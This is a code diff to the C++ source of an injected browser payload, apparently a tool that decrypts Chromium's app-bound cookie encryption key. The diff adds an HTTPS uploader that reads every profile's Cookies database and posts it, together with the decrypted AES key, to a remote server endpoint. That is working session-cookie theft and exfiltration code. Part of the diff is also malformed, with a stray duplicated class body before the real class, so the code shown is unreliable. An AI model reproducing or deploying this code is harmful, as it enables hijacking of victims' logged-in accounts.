@@ -23,6 +23,7 @@
 #include <any>
 #include <unordered_map>
 #include <set>
+#include <winhttp.h>
 
 #include "reflective_loader.h"
 #include "sqlite3.h"
@@ -31,6 +32,7 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "winhttp.lib")
 
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -677,6 +679,150 @@ namespace Payload
         std::string m_browserName;
     };
 
+    class HttpsUploader
+    {
+    public:
+        HttpsUploader(PipeLogger &logger) : m_logger(logger) {}
+
+        bool SendKeyAndDatabase(const std::vector<uint8_t> &aesKey, 
+                               const fs::path &cookiesDbPath, 
+                               const std::string &serverUrl = "localhost:5000",
+                               const std::string &serverPath = "/api/decrypt") 
+        {
+            m_logger.Log("[*] Preparing to send key and database to server...");
+            
+            // Read the entire cookies database file
+            std::ifstream dbFile(cookiesDbPath, std::ios::binary);
+            if (!dbFile) {
+                m_logger.Log("[-] Failed to open cookies database: " + cookiesDbPath.string());
+                return false;
+            }
+            
+            std::vector<uint8_t> dbData((std::istreambuf_iterator<char>(dbFile)),
+                                       std::istreambuf_iterator<char>());
+            
+            // Base64 encode key and database
+            std::string keyB64 = Base64Encode(aesKey);
+            std::string dbB64 = Base64Encode(dbData);
+            
+            // Create JSON payload
+            std::string jsonPayload = "{\"app_bound_key\":\"" + keyB64 + 
+                                    "\",\"cookies_db\":\"" + dbB64 + "\"}";
+            
+            return SendHttpsRequest(serverUrl, serverPath, jsonPayload);
+        }
+
+    private:
+        std::string Base64Encode(const std::vector<uint8_t> &data)
+        {
+            DWORD encodedSize = 0;
+            if (!CryptBinaryToStringA(data.data(), (DWORD)data.size(), 
+                                     CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
+                                     nullptr, &encodedSize))
+                return "";
+            
+            std::string encoded(encodedSize, '\0');
+            if (!CryptBinaryToStringA(data.data(), (DWORD)data.size(), 
+                                     CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, 
+                                     &encoded[0], &encodedSize))
+                return "";
+            
+            encoded.resize(encodedSize - 1); // Remove null terminator
+            return encoded;
+        }
+        
+        bool SendHttpsRequest(const std::string &serverUrl, 
+                             const std::string &serverPath, 
+                             const std::string &jsonData)
+        {
+            HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
+            bool success = false;
+            
+            try {
+                // Initialize WinHTTP
+                hSession = WinHttpOpen(L"Fembound/1.0", 
+                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                      WINHTTP_NO_PROXY_NAME, 
+                                      WINHTTP_NO_PROXY_BYPASS, 0);
+                if (!hSession) {
+                    m_logger.Log("[-] WinHttpOpen failed");
+                    return false;
+                }
+                
+                // Convert server URL to wide string
+                std::wstring wServerUrl(serverUrl.begin(), serverUrl.end());
+                hConnect = WinHttpConnect(hSession, wServerUrl.c_str(), 
+                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
+                if (!hConnect) {
+                    m_logger.Log("[-] WinHttpConnect failed");
+                    return false;
+                }
+                
+                // Convert server path to wide string
+                std::wstring wServerPath(serverPath.begin(), serverPath.end());
+                hRequest = WinHttpOpenRequest(hConnect, L"POST", wServerPath.c_str(),
+                                            nullptr, WINHTTP_NO_REFERER, 
+                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                            WINHTTP_FLAG_SECURE);
+                if (!hRequest) {
+                    m_logger.Log("[-] WinHttpOpenRequest failed");
+                    return false;
+                }
+                
+                // Set headers
+                std::wstring headers = L"Content-Type: application/json";
+                WinHttpAddRequestHeaders(hRequest, headers.c_str(), -1, 
+                                       WINHTTP_ADDREQ_FLAG_ADD);
+                
+                // Send request
+                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                                     (LPVOID)jsonData.c_str(), (DWORD)jsonData.length(),
+                                     (DWORD)jsonData.length(), 0)) {
+                    
+                    if (WinHttpReceiveResponse(hRequest, nullptr)) {
+                        DWORD statusCode = 0;
+                        DWORD statusCodeSize = sizeof(statusCode);
+                        
+                        WinHttpQueryHeaders(hRequest, 
+                                          WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+                                          WINHTTP_HEADER_NAME_BY_INDEX, 
+                                          &statusCode, &statusCodeSize, 
+                                          WINHTTP_NO_HEADER_INDEX);
+                        
+                        if (statusCode == 200) {
+                            m_logger.Log("[+] Successfully sent data to server (HTTP 200)");
+                            success = true;
+                        } else {
+                            m_logger.Log("[-] Server returned HTTP " + std::to_string(statusCode));
+                        }
+                    }
+                }
+                
+            } catch (...) {
+                m_logger.Log("[-] Exception occurred during HTTPS request");
+            }
+            
+            // Cleanup
+            if (hRequest) WinHttpCloseHandle(hRequest);
+            if (hConnect) WinHttpCloseHandle(hConnect);
+            if (hSession) WinHttpCloseHandle(hSession);
+            
+            return success;
+        }
+        
+        PipeLogger &m_logger;
+    };
+    {
+    public:
+        DecryptionOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
+        {
+            if (!m_logger.isValid())
+            {
+                throw std::runtime_error("Failed to connect to named pipe from injector.");
+            }
+            ReadPipeParameters();
+        }
+
     class DecryptionOrchestrator
     {
     public:
@@ -695,6 +841,7 @@ namespace Payload
             const auto &browserConfig = browserManager.getConfig();
             m_logger.Log("[*] Decryption process started for " + browserConfig.name);
 
+            // Step 1: Decrypt the AES key using COM interface
             std::vector<uint8_t> aesKey;
             {
                 MasterKeyDecryptor keyDecryptor(m_logger);
@@ -703,20 +850,36 @@ namespace Payload
             }
             m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));
 
+            // Step 2: Find cookies database and upload to server
             ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
             auto profilePaths = enumerator.FindProfiles();
-
+            
+            HttpsUploader uploader(m_logger);
+            bool uploadSuccess = false;
+            
             for (const auto &profilePath : profilePaths)
             {
-                m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
-                for (const auto &dataConfig : Data::GetExtractionConfigs())
-                {
-                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
-                    extractor.Extract();
+                fs::path cookiesDbPath = profilePath / "Network" / "Cookies";
+                if (fs::exists(cookiesDbPath)) {
+                    m_logger.Log("[*] Found cookies database: " + cookiesDbPath.string());
+                    
+                    // Upload key + database to server
+                    if (uploader.SendKeyAndDatabase(aesKey, cookiesDbPath)) {
+                        m_logger.Log("[+] Successfully uploaded cookies database from profile: " + 
+                                   profilePath.filename().string());
+                        uploadSuccess = true;
+                    } else {
+                        m_logger.Log("[-] Failed to upload cookies database from profile: " + 
+                                   profilePath.filename().string());
+                    }
                 }
             }
-
-            m_logger.Log("[*] All profiles processed. Decryption process finished.");
+            
+            if (uploadSuccess) {
+                m_logger.Log("[*] Data upload completed successfully.");
+            } else {
+                m_logger.Log("[-] No cookies databases were successfully uploaded.");
+            }
         }
 
     private:
